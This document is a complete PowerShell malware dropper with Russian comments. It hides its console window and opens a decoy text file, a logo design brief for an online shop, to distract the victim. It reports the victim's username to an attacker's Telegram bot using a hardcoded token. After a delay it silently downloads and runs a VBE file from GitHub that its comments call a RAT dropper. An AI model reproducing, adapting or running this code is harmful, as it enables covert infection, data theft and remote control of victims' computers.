# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "logo redesign.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Техзадание: обновить логотип для FragStore.

Что хотим:
  Новый логотип для нашего интернет‑магазина FragStore. Нужен крутой, уверенный и современный стиль.

Цвета:
  Предлагаем такие сочетания:
  Оранжевый + Чёрный: #FF8C00 + #000000
  Тёмно‑оранжевый + Тёмно‑серый: #FF7A00 + #1F1F1F
  Яркий оранжевый + Белый + Чёрный акцент: #FFA500 + #FFFFFF + #000000
  Насыщенный чёрный + Неоновый оранжевый акцент: #000000 + #FF6A00
  Оранжевый‑металлик + Тёмно‑серый: #FF8C00 + #2B2B2B
  Градиент (можно для деталей): #FF8C00 → #FFA500

Идеи для логотипа (выберите любую):
  1. Буква F в виде кнопки включения.
  2. Буквы FS как шестиугольная мозаика.
  3. Эмблема в форме щита с молнией – чтобы чувствовалась надёжность и скорость.
  4. Простая иконка в виде корпуса или видеокарты.
  5. Курсор/стрелка + коробка/корзина – намёк на онлайн‑заказ и доставку.
  6. Наклонные линии – чтобы передать динамику и мощь.

Файлы:
  Обязательно: векторный файл SVG.
  Ещё: PNG/JPG для показа.
  Нужен файл с кодами цветов и названиями шрифтов.
  Минимальный размер значка: 24 пикселя.
  Никаких очень мелких деталей и плавных переходов.
  Нужны варианты для светлого и тёмного фона.
  Присылайте работы с водяными знаками.

Шрифты (если есть возможность):
  Montserrat – начертания 500/700/800.
  Rubik – начертания 500/700.
  Inter – начертания 400/600.
  PT Sans – начертания 400/700.
  Roboto Condensed – начертания 500/700 (не обязательно).

Сроки и доработки:
  Сделаем за 9 дней, не торопимся.
  Две итерации с правками.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit